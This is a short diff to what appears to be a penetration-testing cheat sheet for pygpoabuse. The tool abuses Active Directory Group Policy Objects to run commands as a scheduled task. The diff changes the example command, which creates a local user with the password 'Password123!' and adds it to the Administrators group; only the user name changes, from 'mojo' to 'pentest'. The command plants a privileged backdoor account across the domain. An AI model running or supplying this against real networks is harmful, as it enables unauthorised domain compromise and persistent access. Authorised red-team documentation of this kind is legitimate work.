@@ -7,4 +7,4 @@ pygpoabuse -gpo-id <gpo_id> -command '<cmd>' -taskname '<task_name|beans>' -desc
 ```
 
 - cmd
-net user mojo Password123! /add && net localgroup Administrators mojo /add
+net user pentest Password123! /add && net localgroup Administrators pentest /add
